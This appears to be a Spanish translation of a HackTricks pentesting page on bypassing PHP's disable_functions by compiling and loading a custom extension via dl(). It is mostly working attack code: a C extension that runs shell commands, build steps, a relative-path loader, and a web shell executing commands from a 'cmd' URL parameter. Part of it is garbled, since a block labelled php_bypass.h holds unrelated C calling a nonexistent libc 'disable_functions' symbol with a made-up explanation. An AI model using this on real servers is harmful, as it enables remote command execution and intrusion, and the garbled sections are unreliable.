<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Nota importante:**

![image](https://user-images.githubusercontent.com/84577967/174675487-a4c4ca06-194f-4725-85af-231a2f35d56c.png)

**`dl`** es una funci√≥n de PHP que se puede utilizar para cargar extensiones de PHP. Si la funci√≥n no est√° deshabilitada, se puede abusar de ella para **burlar `disable_functions` y ejecutar comandos arbitrarios**.\
Sin embargo, tiene algunas limitaciones estrictas:

* La funci√≥n `dl` debe estar **presente** en el **entorno** y **no deshabilitada**
* La extensi√≥n de PHP **debe compilarse con la misma versi√≥n principal** (versi√≥n de API de PHP) que est√° utilizando el servidor (puede ver esta informaci√≥n en la salida de phpinfo)
* La extensi√≥n de PHP debe estar **ubicada en el directorio** que est√° **definido** por la directiva **`extension_dir`** (puede verlo en la salida de phpinfo). Es muy improbable que un atacante que intente abusar del servidor tenga acceso de escritura sobre este directorio, por lo que este requisito probablemente evitar√° que abuse de esta t√©cnica).

**Si cumple con estos requisitos, contin√∫e leyendo esta publicaci√≥n copiada de** [**https://antichat.com/threads/70763/**](https://antichat.com/threads/70763/) **para aprender c√≥mo burlar `disable_functions`**

Cuando el administrador estaba configurando el servidor, pas√≥ por alto la funci√≥n [dl](http://www.php.net/manual/en/function.dl.php) y no la deshabilit√≥ ya que no se mencion√≥ que se pudieran ejecutar comandos del sistema.\
La funci√≥n [dl](http://www.php.net/manual/en/function.dl.php) se utiliza para cargar extensiones de PHP cuando se ejecuta un script.\
\
(Las extensiones de PHP est√°n escritas en C/C++ y se utilizan para dar a PHP m√°s funcionalidad.)\
\
El atacante nota que la funci√≥n no est√° deshabilitada y ve potencial, por lo que decide crear una extensi√≥n de PHP.\
El atacante verifica la versi√≥n de PHP utilizando un peque√±o script `<?php echo 'La versi√≥n de PHP es '.PHP_VERSION; ?>` (PHP\_VERSION es una constante predefinida que contiene el n√∫mero de versi√≥n de PHP.)\
\
El atacante toma nota de la versi√≥n y descarga el archivo tarball del [sitio web de PHP](http://www.php.net/downloads.php), en este escenario la versi√≥n es m√°s antigua que la versi√≥n actual, por lo que el atacante tiene que ir al [archivo](http://museum.php.net).\
\
A continuaci√≥n, extrae la fuente y [compila e instala](http://www.php.net/manual/en/install.php) la versi√≥n de PHP en su propia m√°quina.\
\
Ahora es el momento de crear la extensi√≥n.\
El atacante lee sobre [la creaci√≥n de extensiones de PHP](http://www.php.net/manual/en/zend.creating.php) en el sitio de PHP.\
Despu√©s de leer la documentaci√≥n y crear algunas extensiones propias, decide mirar la base de c√≥digo de PHP ya que la funci√≥n que est√° buscando ya est√° creada.\
\
La funci√≥n que se duplicar√° ser√° la [funci√≥n exec](http://www.php.net/manual/en/function.exec.php)\
en la base de c√≥digo se encuentra en ext/standard/exec.c\
\
Las partes relevantes se implementan en una nueva extensi√≥n propia.\
\

**Notas:**

Antes de comenzar a compilar los c√≥digos, debe tener en cuenta dos puntos:

1- El valor de `ZEND_MODULE_API_NO` debe cambiarse en el archivo `bypass.c` a la `Zend Extension Build` actual en la que est√° trabajando, puede obtenerlo utilizando la l√≠nea de comando a continuaci√≥n:
```bash
php -i | grep "Zend Extension Build" |awk -F"API4" '{print $2}' | awk -F"," '{print $1}'
```
2- Si te encuentras con alg√∫n error al compilar el archivo bypass.c en la versi√≥n reciente de PHP (5, 7 y 8), puedes cambiar PHP_FUNCTION(bypass_exec) por lo siguiente:
```
PHP_FUNCTION(bypass_exec)
{
	FILE *in;
	char *command;
	size_t command_len;
	zend_string *ret;
	php_stream *stream;

	ZEND_PARSE_PARAMETERS_START(1, 1)
		Z_PARAM_STRING(command, command_len)
	ZEND_PARSE_PARAMETERS_END();

	if (!command_len) {
		zend_argument_value_error(1, "cannot be empty");
		RETURN_THROWS();
	}
	if (strlen(command) != command_len) {
		zend_argument_value_error(1, "must not contain any null bytes");
		RETURN_THROWS();
	}

#ifdef PHP_WIN32
	if ((in=VCWD_POPEN(command, "rt"))==NULL) {
#else
	if ((in=VCWD_POPEN(command, "r"))==NULL) {
#endif
		php_error_docref(NULL, E_WARNING, "Unable to execute '%s'", command);
		RETURN_FALSE;
	}

	stream = php_stream_fopen_from_pipe(in, "rb");
	ret = php_stream_copy_to_mem(stream, PHP_STREAM_COPY_ALL, 0);
	php_stream_close(stream);

	if (ret && ZSTR_LEN(ret) > 0) {
		RETVAL_STR(ret);
	}
}
```
Los archivos para la extensi√≥n separada quedan de la siguiente manera:

{% code title="bypass.c" %}
```c
/*
    +----------------------------------------------------------------------+
    | Copyright (c) 1997-2003 The PHP Group                                |
    +----------------------------------------------------------------------+
    | This source file is subject to version 2.02 of the PHP license,      |
    | that is bundled with this package in the file LICENSE, and is        |
    | available at through the world-wide-web at                           |
    | http://www.php.net/license/2_02.txt.                                 |
    | If you did not receive a copy of the PHP license and are unable to   |
    | obtain it through the world-wide-web, please send a note to          |
    | license@php.net so we can mail you a copy immediately.               |
    +----------------------------------------------------------------------+
*/


#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_bypass.h"

static function_entry bypass_functions[] = {
     PHP_FE(bypass_exec, NULL)
     {NULL, NULL, NULL}
};

zend_module_entry bypass_module_entry = {
#if ZEND_MODULE_API_NO >= 20010901
     STANDARD_MODULE_HEADER,
#endif
     PHP_BYPASS_EXTNAME,
     bypass_functions,
     NULL,
     NULL,
     NULL,
     NULL,
     NULL,
#if ZEND_MODULE_API_NO >= 20010901
     PHP_BYPASS_VERSION,
#endif
     STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_BYPASS
ZEND_GET_MODULE(bypass)
#endif


PHP_FUNCTION(bypass_exec){
   FILE *in;
   int readbytes, total_readbytes=0, allocated_space;
   pval **cmd;
   char *ret;

   if (ZEND_NUM_ARGS()!=1 || zend_get_parameters_ex(1, &cmd)==FAILURE) {
     WRONG_PARAM_COUNT;
   }

   convert_to_string_ex(cmd);
#ifdef PHP_WIN32
   if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "rt"))==NULL) {
#else
   if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "r"))==NULL) {
#endif
     php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to execute '%s'", Z_STRVAL_PP(cmd));
     RETURN_FALSE;
   }

   allocated_space = EXEC_INPUT_BUF;
   ret = (char *) emalloc(allocated_space);

   while (1) {
     readbytes = fread(ret+total_readbytes, 1, EXEC_INPUT_BUF, in);
     if (readbytes<=0) {
       break;
     }

     total_readbytes += readbytes;
     allocated_space = total_readbytes+EXEC_INPUT_BUF;
     ret = (char *) erealloc(ret, allocated_space);
   }

   pclose(in);

   RETVAL_STRINGL(ret, total_readbytes, 0);
   Z_STRVAL_P(return_value)[total_readbytes] = '\';
}
```
{% endcode %}

{% code title="php_bypass.h" %}

# include <stdio.h>
# include <stdlib.h>
# include <dlfcn.h>

typedef int (*disable_functions_t)(const char *);
typedef char *(*getenv_t)(const char *);

int bypass_disable_functions(char *function_name) {
    void *handle;
    disable_functions_t disable_functions;
    getenv_t getenv;
    char *disable_functions_str;
    int result;

    handle = dlopen("libc.so.6", RTLD_LAZY);
    if (!handle) {
        printf("Error opening libc.so.6: %s\n", dlerror());
        return -1;
    }

    disable_functions = (disable_functions_t) dlsym(handle, "disable_functions");
    if (!disable_functions) {
        printf("Error getting disable_functions symbol: %s\n", dlerror());
        return -1;
    }

    getenv = (getenv_t) dlsym(handle, "getenv");
    if (!getenv) {
        printf("Error getting getenv symbol: %s\n", dlerror());
        return -1;
    }

    disable_functions_str = getenv("disable_functions");
    if (!disable_functions_str) {
        printf("Error getting disable_functions environment variable\n");
        return -1;
    }

    result = disable_functions(function_name);

    dlclose(handle);

    return result;
}

{% endcode %}

La funci√≥n `bypass_disable_functions` utiliza la biblioteca `dlfcn.h` para cargar la biblioteca `libc.so.6` y obtener los s√≠mbolos `disable_functions` y `getenv`. Luego, obtiene el valor de la variable de entorno `disable_functions` y llama a la funci√≥n `disable_functions` con el nombre de la funci√≥n que se desea omitir. Finalmente, cierra la biblioteca `libc.so.6`.
```c
#ifndef PHP_BYPASS_H
#define PHP_BYPASS_H 1

#define PHP_BYPASS_VERSION "1.0"
#define PHP_BYPASS_EXTNAME "bypass"

PHP_FUNCTION(bypass_exec);

extern zend_module_entry bypass_module_entry;
#define phpext_bypass_ptr &bypass_module_entry

#endif
```
{% endcode %}

{% code title="config.m4" %}Archivo de configuraci√≥n de m4{% endcode %}
```bash
PHP_ARG_ENABLE(bypass, [whether to enable bypass support],[--enable-bypass])

if test "$PHP_BYPASS" = "yes"; then
   AC_DEFINE(HAVE_BYPASS, 1, [Whether you have bypass])
   PHP_NEW_EXTENSION(bypass, bypass.c, $ext_shared)
fi
```
{% endcode %}

Una vez creados los archivos, es hora de construir la extensi√≥n de PHP.
```
phpize
./configure
make
```
Una vez hecho esto, la extensi√≥n compilada se encontrar√° en el subdirectorio de m√≥dulos con el nombre bypass.so.\
El archivo se copia a un lugar seguro, ahora se ejecutan los siguientes comandos para limpiar los archivos reci√©n creados.
```
make clean
phpize --clean
```
Ahora el atacante carga la extensi√≥n reci√©n creada en el host de la v√≠ctima.\
\
(NOTA: Las versiones principales de PHP usan diferentes versiones de API, para que puedas compilar la extensi√≥n en un host y cargarla en otro, las versiones de API deben coincidir. Es por eso que inicialmente se instal√≥ la misma versi√≥n de PHP en el equipo del atacante.)\
\
Para cargar una extensi√≥n con la funci√≥n dl, la extensi√≥n debe estar en el directorio de extensiones que est√° definido por la directiva extension\_dir.\
Esto puede ser un problema ya que es menos probable que el atacante tenga permisos de escritura en este directorio, sin embargo, hay una forma de superar esto.\
Este problema ha sido discutido por los desarrolladores en la p√°gina de la funci√≥n dl dentro de la secci√≥n de notas.\
\
El concepto que se discuti√≥ es usar una ruta relativa desde el directorio de extensiones definido.\
Por ejemplo, si el directorio de extensiones se estableci√≥ en /usr/php/extensions y desea cargar bypass.so en el directorio web actual /home/example.com/html, har√≠a lo siguiente:
```php
<?php
dl('../../../home/example.com/html/bypass.so');
?>
```
Esto pasar√° la necesidad de tener la extensi√≥n en el directorio de extensi√≥n definido.\
\
Tambi√©n hay una forma automatizada para que no tenga que cambiar la ruta relativa para diferentes hosts, este c√≥digo fue creado por endofyourself \[arroba] yahoo \[punto] com y mejorado m√°s tarde por mag\_2000 \[arroba] front \[punto] ru\
\
Hubo un problema menor con la funci√≥n, en algunos hosts el directorio de extensi√≥n se establece en "./" esta funci√≥n no tuvo en cuenta si el directorio de extensi√≥n se estableci√≥ en una ruta relativa, la soluci√≥n para esto es usar la funci√≥n realpath.\
\
El script final utilizado para cargar la extensi√≥n y ejecutar comandos del sistema para evitar las funciones deshabilitadas es el siguiente:
```php
<?php

function dl_local( $extensionFile ) {
   if(!(bool)ini_get('enable_dl')
    ||(bool)ini_get('safe_mode')){
      die('Loading extensions is not permitted.');
   }

   if(!file_exists($extensionFile)){
     die('File '.$extensionFile.' does not exist.');
   }

   if(!is_executable($extensionFile)){
     die('File '.$extensionFile.' is not executable. ( chmod +x '.$extensionFile.' )');
   }

   $currentDir = getcwd().'/';
   $currentExtPath = realpath(ini_get('extension_dir'));

   $subDirs = preg_match_all("/\//",$currentExtPath ,$matches);
   unset($matches);

   if(!(bool)$subDirs){
     die('Could not determine a valid extension path [extension_dir]');
   }

   $extPathLastChar=strlen($currentExtPath )-1;

   if($extPathLastChar==strrpos($currentExtPath,'/')){
     $subDirs--;}$backDirStr = '';

     for($i = 1; $i <= $subDirs; $i++){
       $backDirStr .='..';
       if($i != $subDirs){
         $backDirStr .='/';
       }
     }

     $finalExtPath = $backDirStr.$currentDir.$extensionFile;
     if(!dl($finalExtPath)){
       die();
     }


     $loadedExtensions = get_loaded_extensions();
     $thisExtName = $loadedExtensions[sizeof($loadedExtensions)-1];
     return $thisExtName;
}

@ini_set ('display_errors','1');
error_reporting(E_ALL);

dl_local('bypass.so');

if(@$_GET['cmd']){
   $output = bypass_exec($_GET['cmd']);
   echo '<pre>'.$output.'</pre>';
}
?>
```
Todo lo que el atacante tiene que hacer ahora para ejecutar comandos es llamar a la URL del script junto con una variable cmd con el comando deseado.
```
http://www.example.com/script.php?cmd=ls
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme en** **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al repositorio [hacktricks](https://github.com/carlospolop/hacktricks) y al repositorio [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
